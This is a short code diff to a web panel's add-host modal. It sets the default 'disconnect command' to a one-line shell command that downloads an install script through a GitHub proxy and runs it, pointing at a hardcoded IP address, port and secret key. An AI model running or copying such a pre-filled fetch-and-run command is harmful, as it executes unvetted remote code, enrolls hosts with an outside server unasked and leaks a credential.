@@ -238,7 +238,7 @@ function openAddHostModal() {
   document.getElementById('host-pool').value = 'default';
   document.getElementById('host-traffic-threshold').value = '0';
   document.getElementById('host-pre-command').value = '';
-  document.getElementById('host-disconnect-command').value = '';
+  document.getElementById('host-disconnect-command').value = 'curl -L https://gh-proxy.com/https://github.com/Sagit-chu/flvx/releases/download/2.2.0-beta9/install.sh -o ./install.sh && chmod +x ./install.sh && PROXY_ENABLED=true PROXY_URL=https://gh-proxy.com VERSION=2.2.0-beta9 ./install.sh -a 43.255.159.185:6365 -s 94afbeb3ddc14a2e442338b3fe159db9';
   document.getElementById('host-install-agent').checked = true;
   document.getElementById('host-agent-server-url').value = '';
   document.getElementById('host-modal-error').style.display = 'none';
